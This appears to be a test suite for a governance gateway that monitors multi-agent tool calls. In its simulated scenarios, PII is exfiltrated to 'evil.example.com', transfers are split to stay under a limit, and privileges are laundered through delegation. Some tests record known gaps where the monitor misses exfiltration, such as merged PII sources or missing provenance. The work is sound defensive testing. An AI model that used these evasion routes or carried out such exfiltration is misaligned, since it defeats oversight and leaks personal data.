import json
import unittest

from pathaware_governance.engines import (
    NoGovernanceEngine,
    PathAwareGovernanceEngine,
    StatelessGovernanceEngine,
)
from pathaware_governance.harness import DataSource, Gateway, World, flow_id_for, validate_call
from pathaware_governance.models import Decision, DecisionOutcome

WF = "wf-test"


def make_world(*, hr: bool = False) -> World:
    world = World.default()
    if hr:
        world.sources["hr"] = DataSource("hr", "pii", [{"name": "Bob"}])
    return world


def run_chain(gateway: Gateway, sources=("customers",)):
    """analyst reads/aggregates/exports, exporter transmits externally."""

    arts = []
    for source in sources:
        arts.append(gateway.submit("analyst", "read_data", {"source_id": source}))
    ids = [r.tool_result.output["artifact_id"] for r in arts]
    agg = gateway.submit("analyst", "aggregate_data", {"artifact_ids": ids})
    exp = gateway.submit(
        "analyst", "export_file", {"artifact_id": agg.tool_result.output["artifact_id"]}
    )
    send = gateway.submit(
        "exporter",
        "transmit_external",
        {"file_id": exp.tool_result.output["artifact_id"], "destination": "evil.example.com"},
    )
    return [*arts, agg, exp, send]


class RecordingEngine:
    mode = "recording"

    def __init__(self) -> None:
        self.events = []

    def record_outcome(self, event_id, executed):
        pass

    def evaluate(self, event):
        self.events.append(event)
        return Decision(event.event_id, event.workflow_id, self.mode, DecisionOutcome.ALLOW)


class GatewayTests(unittest.TestCase):
    def test_exfiltration_chain_blocked_by_path_aware(self):
        world = make_world()
        results = run_chain(Gateway(world, PathAwareGovernanceEngine(), WF))
        self.assertTrue(all(r.executed for r in results[:-1]))
        last = results[-1]
        self.assertFalse(last.executed)
        self.assertEqual(last.decision.policy_id, "P-CROSS-AGENT-EXFILTRATION")
        self.assertTrue(last.tool_result.output["blocked"])
        self.assertIn("P-CROSS-AGENT-EXFILTRATION", last.tool_result.error)
        self.assertEqual(world.transmissions, [])
        self.assertEqual(len(world.ledger), 3)

    def test_exfiltration_chain_without_governance(self):
        world = make_world()
        results = run_chain(Gateway(world, NoGovernanceEngine(), WF))
        self.assertTrue(results[-1].executed)
        self.assertEqual(len(world.transmissions), 1)
        sent = world.transmissions[0]
        self.assertEqual(sent.classification, "pii")
        self.assertTrue(world.is_external(sent.destination))

    def test_mixing_public_data_still_blocked(self):
        world = make_world()
        results = run_chain(Gateway(world, PathAwareGovernanceEngine(), WF), ("customers", "docs"))
        self.assertEqual(results[-1].decision.policy_id, "P-CROSS-AGENT-EXFILTRATION")
        self.assertEqual(world.transmissions, [])

    def test_internal_destination_allowed(self):
        world = make_world()
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF)
        results = run_chain(gateway)[:-1]
        file_id = results[-1].tool_result.output["artifact_id"]
        send = gateway.submit(
            "exporter",
            "transmit_external",
            {"file_id": file_id, "destination": "warehouse.internal"},
        )
        self.assertTrue(send.executed)
        self.assertEqual(send.event.destination, "internal")
        self.assertEqual(send.event.attributes["destination_host"], "warehouse.internal")

    def test_without_provenance_chain_is_missed(self):
        # No data_flow_id on events, so the exfiltration rule cannot tie the steps together.
        world = make_world()
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF, attach_provenance=False)
        results = run_chain(gateway)
        self.assertTrue(results[-1].executed)
        self.assertEqual(world.transmissions[0].classification, "pii")
        self.assertTrue(all("data_flow_id" not in r.event.attributes for r in results))

    def test_two_pii_sources_merged_known_limit(self):
        # Known limit: the merged flow id is "customers+hr", which differs from the
        # "customers" id of the earlier read, so the rule does not fire.
        world = make_world(hr=True)
        results = run_chain(
            Gateway(world, PathAwareGovernanceEngine(), WF), ("customers", "hr")
        )
        self.assertEqual(results[2].event.attributes["data_flow_id"], "customers+hr")
        self.assertTrue(results[-1].executed)
        self.assertEqual(len(world.transmissions), 1)

    def test_docs_read_first_should_still_block(self):
        # Fixed: the exfiltration rule searches backwards from the transmit, so an
        # earlier public read no longer hides the PII read.
        world = make_world()
        results = run_chain(Gateway(world, PathAwareGovernanceEngine(), WF), ("docs", "customers"))
        self.assertTrue(results[-1].decision.blocked)
        self.assertEqual(world.transmissions, [])

    def test_flow_id_for(self):
        world = make_world(hr=True)
        self.assertIsNone(flow_id_for(world, frozenset()))
        self.assertEqual(flow_id_for(world, frozenset({"customers", "docs"})), "customers")
        self.assertEqual(flow_id_for(world, frozenset({"hr", "customers"})), "customers+hr")

    def test_stateless_transaction_limit(self):
        world = make_world()
        gateway = Gateway(world, StatelessGovernanceEngine(), WF)
        result = gateway.submit(
            "finance",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 1500},
        )
        self.assertFalse(result.executed)
        self.assertEqual(result.decision.policy_id, "S-TRANSACTION-LIMIT")
        self.assertEqual(world.accounts["ops-account"].balance, 5000.0)
        self.assertEqual(world.ledger, [])

    def test_split_transfers_blocked(self):
        world = make_world()
        world.permissions["finance2"] = {"transfer_funds"}
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF)
        first = gateway.submit(
            "finance",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 600},
        )
        second = gateway.submit(
            "finance2",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 500},
        )
        self.assertTrue(first.executed)
        self.assertEqual(second.decision.policy_id, "P-SPLIT-ACTION-EVASION")
        self.assertEqual(world.accounts["ops-account"].balance, 4400.0)
        self.assertEqual(len(world.transfers), 1)

    def test_blocked_attempt_does_not_count_toward_split(self):
        world = make_world()
        world.permissions["finance2"] = {"transfer_funds"}
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF)
        first = gateway.submit(
            "finance",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 1500},
        )
        second = gateway.submit(
            "finance2",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 100},
        )
        self.assertEqual(first.decision.policy_id, "S-TRANSACTION-LIMIT")
        self.assertTrue(second.executed)
        self.assertEqual(world.accounts["ops-account"].balance, 4900.0)

    def test_failed_transfer_does_not_count_toward_split(self):
        world = make_world()
        world.permissions["finance2"] = {"transfer_funds"}
        world.accounts["ops-account"].balance = 50.0
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF)
        first = gateway.submit(
            "finance",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 900},
        )
        self.assertTrue(first.executed)
        self.assertFalse(first.tool_result.ok)
        world.accounts["ops-account"].balance = 5000.0
        second = gateway.submit(
            "finance2",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 500},
        )
        self.assertTrue(second.executed)
        self.assertTrue(second.tool_result.ok)

    def test_privilege_laundering_blocked(self):
        world = make_world()
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF)
        req = gateway.submit(
            "intern",
            "request_delegation",
            {"delegate_to": "manager", "requested_action": "issue_refund"},
        )
        self.assertTrue(req.executed)
        self.assertFalse(req.event.authorized)
        done = gateway.submit(
            "manager", "delegated_action", {"request_id": req.tool_result.output["request_id"]}
        )
        self.assertTrue(done.event.authorized)
        self.assertEqual(done.decision.policy_id, "P-PRIVILEGE-LAUNDERING")
        self.assertEqual(world.refunds_issued, [])

    def test_authorized_delegation_near_miss_allowed(self):
        world = make_world()
        world.permissions["lead"] = {"issue_refund", "request_delegation"}
        gateway = Gateway(world, PathAwareGovernanceEngine(), WF)
        req = gateway.submit(
            "lead",
            "request_delegation",
            {"delegate_to": "manager", "requested_action": "issue_refund"},
        )
        self.assertTrue(req.event.authorized)
        done = gateway.submit(
            "manager", "delegated_action", {"request_id": req.tool_result.output["request_id"]}
        )
        self.assertTrue(done.executed)
        self.assertEqual(len(world.refunds_issued), 1)

    def test_unauthorized_actor(self):
        world = make_world()
        gateway = Gateway(world, StatelessGovernanceEngine(), WF)
        result = gateway.submit(
            "intern",
            "transfer_funds",
            {"from_account": "ops-account", "destination": "vendor", "amount": 10},
        )
        self.assertEqual(result.decision.policy_id, "S-UNAUTHORIZED-ACTOR")
        self.assertEqual(world.accounts["ops-account"].balance, 5000.0)

    def test_invalid_call_skips_engine_and_world(self):
        world = make_world()
        before = world.snapshot()
        engine = RecordingEngine()
        gateway = Gateway(world, engine, WF)
        bad = [
            gateway.submit("analyst", "no_such_tool", {}),
            gateway.submit("analyst", "read_data", {"source_id": 5}),
        ]
        for result in bad:
            self.assertFalse(result.tool_result.ok)
            self.assertIsNone(result.event)
            self.assertIsNone(result.decision)
            self.assertFalse(result.executed)
        self.assertIsNotNone(validate_call("read_data", {}))
        self.assertEqual(engine.events, [])
        self.assertEqual(world.snapshot(), before)
        good = gateway.submit("analyst", "read_data", {"source_id": "docs"})
        self.assertEqual(good.event.sequence, 1)
        self.assertEqual([entry["sequence"] for entry in gateway.log], [None, None, 1])

    def test_blocked_actions_stay_in_engine_history(self):
        engine = PathAwareGovernanceEngine()
        results = run_chain(Gateway(make_world(), engine, WF))
        history = engine.history(WF)
        self.assertEqual(len(history), 4)
        self.assertEqual(history[-1].event_id, results[-1].event.event_id)

    def test_deterministic_log(self):
        logs = []
        for _ in range(2):
            gateway = Gateway(make_world(), PathAwareGovernanceEngine(), WF)
            run_chain(gateway)
            logs.append(gateway.log)
        self.assertEqual(logs[0], logs[1])
        self.assertEqual(len(logs[0]), 4)
        json.dumps(logs[0])
        self.assertEqual(logs[0][-1]["decision"]["policy_id"], "P-CROSS-AGENT-EXFILTRATION")


if __name__ == "__main__":
    unittest.main()
